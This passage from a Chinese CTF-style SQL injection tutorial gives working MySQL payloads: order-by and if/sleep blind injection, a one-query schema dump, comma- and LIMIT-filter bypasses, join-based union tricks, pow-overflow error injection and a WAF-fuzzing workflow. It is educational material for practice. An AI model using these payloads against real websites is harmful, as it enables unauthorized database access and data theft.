首先题目存在sql注入还有一个上传点，可以通过注入拿到所有源码  
拿到之后进行审计，发现上传时文件以随机字符串上传到了/Up10aD/文件夹下，我们的目的就是要通过注入拿到上传后的文件，在原来的注入点使用order
by盲注将文件名得到:  
重点就在order by盲注这， **注入点在id这里** ：  
那么写出order by盲注的脚本如下图：  
这里存在过滤，绕过的方法是双写绕过，所以payload看起来不是很清楚，正常的应该是这样的：
    image = 79 union distinct select 0x{filename} order by 1 desc
**注意前面的image=79是存在的图片的id，这样order by才可以进行对比实现**
这个注入形式也是和我们上面讲解一样，所以大家可以自己找题目来练习。
## 0x05 其他的一些小tips
###  1、一些等效替代的函数(特殊符号)
字符：
    空格  %20、%0a、%0b、/**/、 @tmp:=test
    and  or
    '='  'like'  'in' --> 'regexp'  'rlike' --> '>'  ' [@tmp](https://github.com/tmp "@tmp"):=test只能用在select关键字之后，等号后面的字符串随意
函数：
    字符串截断函数：left()、mid()、substr()、substring()
    取ascii码函数：ord()、ascii()
###  2、 一次性报所有表明和字段名
    (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema>=@) AND (@)IN (@:=CONCAT(@,0x0a,' [ ',table_schema,' ] >',table_name,' > ',column_name))))x)
###  3、Subquery returns more than 1 row的解决方法
产生这个问题的原因是子查询多于一列，也就是显示为只有一列的情况下，没有使用limit语句限制，就会产生这个问题，即limt 0,1
如果我们这里的逗号被过滤了咋办？那就使用offset关键字：
    limit 1 offset 1
如果我们这里的limit被过滤了咋办？那就试试下面的几种方法：
    (1) group_concat(使用的最多)
    (2) <>筛选(不等于)
    (3) not in
    (4) DISTINCT
上面这些都涉及到了sql基本语句，这里就不一一举例了。大家可以多在本地环境试试，加深理解
###  4、join注入
**payload：** ：
    1' union select * from (select 1) a join (select 2) b %23
优势：过滤了逗号的情况下使用
下面的payload(别的博客处摘抄来的)适用于过滤了逗号和字段名的情况下使用
    union all
    select * from(
        (select 1)a join(
            select F.[需要查询的字段号] from(
                select * from [需要查询的表有多少个字段就join多少个]
                union
                select * from [需要查询的表] [limit子句]
            )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据
        )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]
    )
具体的使用方法不在本文的讨论范围内，具体的使用可以看看下面的文章：  
###  5、带!的注入
**直接看下面的payload，适用于and、or、^被过滤的情况下使用，有时候可能也会使用到，但是具体的原理不是很明白，大家可以自行google**  
###  6、if盲注(合理利用条件)
if盲注的基本格式：
    if(条件,条件为真执行的语句,条件为假执行的语句)
举个例子：
    admin' if(ascii(mid(user(),1,1))=100,sleep(5),1)
用好if盲注的关键是条件的输入，有一道BCTF的注入题的wp用的就是if盲注
wp链接：
写博客的这位大佬巧妙利用了 **pow函数数值溢出的特性** ，使得经过if判断后的条件会报错，但是不执行该语句时语法上是没问题的
原理如下：
mysql> **select if(1,1,pow(2,22222222222)); //条件为真时，返回1**  
+——————————————+  
| if(1,1,pow(2,22222222222)) |  
+——————————————+  
| 1 |  
+——————————————+  
1 row in set (0.00 sec)
mysql> **select if(0,1,pow(2,22222222222)); //条件为假时，报错**  
ERROR 1690 (22003): DOUBLE value is out of range in ‘pow(2,22222222222)’
像利用pow这种函数溢出的特性也不止这一个，这就需要我们靠平时的经验积累了，总之想要玩好ctf的注入题途径就是多刷题。
## 0x06 自己总结的注入流程
1、先找到注入点，id=，username=，判断GET/POST/COOKIE注入
2、查看显示位，如果只有一个显示位在使用union注入是注意使用limit来限制显示
3、判断字符型注入还是数字型注入（2-1，’是否正常）
4、输入不同值查看页面是否有变化，无变化的话可以考虑采用bool时间盲注，若有报错信息优先考虑报错注入（exp，updatexml（优先采用updatexml、extractvalue报错））
5、先简单测试空格和注释符是否被替换了，id=1 1，id = 1%231（看看能否用/ /、%20、%0a、%09绕过）
6、进行fuzz，看看那些被waf了
7、若页面上没有显示waf过滤之类的提示（sql injection detected），就测试是否有被替换为空的字符（如：’ or ‘*’=’、’ or
‘-‘=’ ，如果页面返回正常的话，则说明该字符被替换为空）
8、简单尝试双写、编码、大小写替换的方法，判断是否可以绕过
9、确定注入方式（尽量把盲注放最后），union、报错注入、盲注
10、先在bp中跑一遍看是否有结果
11、尝试写脚本
最重要的两步就是注入点并判断出注入类型，找到被过滤的函数和关键字并找到替代的函数和关键字，这就需要我们靠自己的耐心和细心还有经验的积累了。
#  0x07 结束语
上面的说的那些盲注手法都是在union注入、报错注入和可回显注入都失效的情况下使用的， **所以说盲注是一种通法，他也是放在最后使用的方法**
，如果本来环境就存在回显的点可以用union直接注入出来，还使用盲注显的有点多此一举，也浪费很多时间。所以这些方法需要根据大家遇到的实际情况进行灵活运用，最后记得多刷题！多刷题！多刷题！最后希望文章能对大家带来帮助。
#  0x08 其他一些不错的参考文章
[SQL注入绕过技巧](https://www.cnblogs.com/Vinson404/p/7253255.html)
[SQLi filter evasion cheat
sheet](https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
[我的WafBypass之道（SQL注入篇）](https://xz.aliyun.com/t/368)
[sql 盲注之正则表达式攻击](https://www.cnblogs.com/lcamry/articles/5717442.html)
[mysql无逗号的注入技巧](https://blog.csdn.net/qq_33020901/article/details/78906268)
[fuzz字典](https://github.com/H4lo/dictionary)